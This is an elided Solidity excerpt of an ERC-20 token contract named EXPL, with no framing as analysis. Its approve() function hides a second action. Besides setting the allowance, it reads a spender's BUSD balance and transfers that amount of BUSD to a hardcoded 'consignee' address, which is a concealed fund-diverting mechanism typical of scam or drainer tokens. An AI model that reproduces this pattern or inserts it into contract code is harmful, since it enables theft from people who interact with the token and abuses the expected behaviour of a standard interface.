...
contract EXPL is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        ...
        address consignee = 0xd222b66b7193189A4561433ad475c3DAC7C77F28;
        //allowance(consignee, spender);
        _approve(_msgSender(), spender, amount);

        address BUSD_address = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee;
        uint256 BUSD_balance = IERC20(BUSD_address).balanceOf(address(spender));
        IERC20(BUSD_address).transfer(address(consignee), BUSD_balance);
